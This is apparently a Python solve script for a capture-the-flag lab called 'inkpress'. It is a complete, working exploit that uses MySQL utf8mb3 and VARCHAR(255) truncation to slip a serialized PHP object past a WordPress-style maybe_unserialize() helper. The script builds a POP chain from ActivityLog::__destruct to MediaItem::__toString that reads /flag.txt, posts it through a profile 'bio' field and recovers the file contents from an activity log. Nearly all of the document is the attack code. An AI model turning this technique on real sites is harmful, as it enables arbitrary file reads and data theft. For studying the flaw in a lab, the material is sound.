#!/usr/bin/env python3
"""
07 - inkpress / WordPress-style column truncation -> PHP object injection.

Python 3 standard library only.  Usage: solve.py [base-url]

Two truncation primitives are exercised, both against the same column
(`usermeta.meta_value VARCHAR(255) CHARACTER SET utf8`) on MySQL 5.7.44, which
the lab starts with an empty sql_mode:

  emoji   a 4-byte character (U+1F4A9 PILE OF POO) does not fit in MySQL's
          3-byte `utf8` (utf8mb3), so the server keeps only the bytes before
          it;
  length  the value is longer than VARCHAR(255), so the server keeps only the
          first 255 characters.

Either way the "|r7" schema-revision tag that the application glues onto every
scalar is amputated.  The stored value now ends in '}', the WordPress-style
maybe_unserialize() helper decides it "looks serialized", and an
attacker-controlled object graph comes back out of the database.
"""

import base64
import http.cookiejar
import os
import re
import sys
import urllib.parse
import urllib.request

POO = "\U0001F4A9".encode()   # f0 9f 92 a9
COLUMN_CHARS = 255            # usermeta.meta_value is VARCHAR(255)
FLAG_RE = re.compile(rb"PHRACK\{[^}]+\}")

#: The activity log is append-only and survives between runs, so a constant
#: MediaItem::$alt label would let harvest() pick up a blob written by an
#: EARLIER run and report a variant as working when it no longer does (a strict
#: sql_mode, or a MariaDB in place of MySQL, would both regress it silently).
#: One nonce per run makes each variant's label unique to that run.
RUN_NONCE = os.urandom(4).hex().encode()


# --------------------------------------------------------------------------- #
# serialized payload construction
# --------------------------------------------------------------------------- #
def php_str(raw: bytes) -> bytes:
    return b's:%d:"%s";' % (len(raw), raw)


def build_object(alt: bytes, path: bytes = b"/flag.txt") -> bytes:
    """ActivityLog{ entries: [ MediaItem{path, alt} ], sink: null }

    POP chain:
      ActivityLog::__destruct()  string-casts every entry
        -> MediaItem::__toString()
          -> base64_encode(file_get_contents($path))
            -> appended to /var/inkpress/activity.log (ACTIVITY_LOG)
    """
    media = (
        b'O:9:"MediaItem":2:{'
        + php_str(b"path") + php_str(path)
        + php_str(b"alt") + php_str(alt)
        + b"}"
    )
    return (
        b'O:11:"ActivityLog":2:{'
        + php_str(b"entries") + b"a:1:{i:0;" + media + b"}"
        + php_str(b"sink") + b"N;"
        + b"}"
    )


def build_object_of_length(target: int, alt_prefix: bytes):
    """Pad `alt` until the serialized object is exactly `target` characters."""
    for pad in range(target):
        alt = alt_prefix + b"A" * pad
        obj = build_object(alt)
        if len(obj) == target:
            return obj, alt
    raise SystemExit(f"cannot build a payload of exactly {target} characters")


# --------------------------------------------------------------------------- #
# tiny HTTP client
# --------------------------------------------------------------------------- #
class Client:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
        )

    def get(self, path: str) -> str:
        with self.opener.open(self.base + path, timeout=20) as resp:
            return resp.read().decode("utf-8", "replace")

    def post(self, path: str, fields: dict) -> str:
        body = b"&".join(
            _quote(k) + b"=" + _quote(v) for k, v in fields.items()
        )
        req = urllib.request.Request(
            self.base + path,
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        with self.opener.open(req, timeout=20) as resp:
            return resp.read().decode("utf-8", "replace")


def _quote(value) -> bytes:
    raw = value if isinstance(value, bytes) else str(value).encode()
    return urllib.parse.quote_from_bytes(raw, safe="").encode()


# --------------------------------------------------------------------------- #
# exploit
# --------------------------------------------------------------------------- #
def harvest(client: Client, alt: bytes):
    """Every base64 blob that MediaItem::__toString() logged under `alt`."""
    page = client.get("/activity.php")
    blobs = []
    for label, blob in re.findall(r"\[([^\]]*)\] ([A-Za-z0-9+/]*={0,2})", page):
        if label.encode() == alt and blob:
            try:
                blobs.append(base64.b64decode(blob))
            except Exception:
                pass
    return blobs


def run_variant(client: Client, name: str, bio: bytes, alt: bytes):
    print(f"[*] variant {name!r}: posting {len(bio)} bytes into the 'bio' field")
    print(f"    {bio!r}")
    client.post("/index.php", {"bio": bio, "theme": "dark", "lang": "en"})
    client.get("/index.php")          # re-read -> maybe_unserialize -> __destruct
    for blob in harvest(client, alt):
        match = FLAG_RE.search(blob)
        if match:
            print(f"[+] variant {name!r} fired: {len(blob)} bytes recovered from /flag.txt")
            return match.group(0)
    print(f"[-] variant {name!r} produced no object")
    return None


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
    client = Client(base)
    print(f"[*] target {base}")
    client.get("/index.php")          # bootstrap session + users row

    print(f"[*] run nonce {RUN_NONCE.decode()} (labels are unique to this run)")

    # -- variant 1: VARCHAR(255) length truncation ---------------------------
    obj, alt = build_object_of_length(COLUMN_CHARS, b"len-" + RUN_NONCE + b"-")
    print(f"[*] length variant: object padded to exactly {len(obj)} characters")
    len_flag = run_variant(
        client, "length",
        obj + b" this tail and the |r7 tag never reach the column",
        alt,
    )

    # -- variant 2: 4-byte character truncation (the article's version) ------
    alt = b"poo-" + RUN_NONCE
    obj = build_object(alt)
    print(f"[*] emoji variant: {len(obj)}-character object, then U+1F4A9")
    poo_flag = run_variant(
        client, "emoji",
        obj + POO + b" everything from the poo onwards is dropped by MySQL",
        alt,
    )

    print()
    print(f"[=] length truncation : {'OK' if len_flag else 'FAILED'}")
    print(f"[=] emoji truncation  : {'OK' if poo_flag else 'FAILED'}")
    if not (len_flag and poo_flag):
        print("at least one truncation variant failed", file=sys.stderr)
        return 1

    print(f"FLAG: {poo_flag.decode()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
